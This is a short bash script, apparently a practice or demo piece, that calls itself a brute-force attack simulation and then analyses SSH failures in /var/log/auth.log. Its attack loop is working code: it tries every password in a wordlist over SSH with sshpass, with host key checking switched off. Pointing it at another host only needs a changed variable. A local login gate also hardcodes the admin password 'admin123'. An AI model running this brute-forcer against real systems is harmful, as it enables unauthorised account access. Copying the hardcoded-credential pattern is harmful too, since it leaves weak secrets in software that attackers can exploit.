#!/bin/bash

TARGET_USER="username"
TARGET_HOST="localhost"
PASSWORD_FILE="passwords.txt"
LOG_FILE="/var/log/auth.log"
ALERT_FILE="suspicious_activity.log"

ADMIN_USER="admin"
ADMIN_PASS="admin123"

attempt_login() {
    local password=$1
    echo "Trying password: $password"
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no $TARGET_USER@$TARGET_HOST exit 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Login successful with password: $password"
        exit 0
    fi
}

analyze_logs() {
    echo "Analyzing log file: $LOG_FILE"
    grep "Failed password" $LOG_FILE > $ALERT_FILE
    echo "Failed login attempts logged to $ALERT_FILE"
    grep "authentication failure" $LOG_FILE >> $ALERT_FILE
    echo "Unauthorized access attempts logged to $ALERT_FILE"
    awk '/Failed password/ {print $11}' $LOG_FILE | sort | uniq -c | sort -nr >> $ALERT_FILE
    echo "Unusual patterns logged to $ALERT_FILE"
}

login_system() {
    read -p "Username: " username
    read -sp "Password: " password
    echo
    if [[ "$username" == "$ADMIN_USER" && "$password" == "$ADMIN_PASS" ]]; then
        echo "Login successful!"
        return 0
    else
        echo "Invalid credentials. Access denied."
        exit 1
    fi
}

login_system

echo "Starting brute force attack simulation..."
while IFS= read -r password; do
    attempt_login "$password"
done < "$PASSWORD_FILE"
echo "Brute force attack simulation completed."

echo "Starting log analysis..."
analyze_logs
echo "Log analysis completed."

echo "All suspicious activities have been logged to $ALERT_FILE."
